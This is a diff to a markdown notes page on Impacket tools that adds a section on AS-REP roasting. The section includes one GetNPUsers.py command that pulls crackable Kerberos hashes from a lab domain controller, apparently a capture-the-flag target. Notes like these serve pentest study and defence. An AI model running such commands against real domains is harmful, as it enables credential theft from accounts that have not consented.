@@ -222,7 +222,13 @@ Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies
 1107: ETH\Message Capture Users (SidTypeAlias) 
 ```
 
+### GetNPUsers
 
+ `AS-REP` roasting is an attack that is often-overlooked in my opinion it is not extremely common as you have to explicitly set `Accounts Does not Require Pre-Authentication` aka `DONT_REQ_PREAUTH`
+
+```text
+root@kali# GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175
+```
 
 ## Full list of tools that featured in Impacket 
 
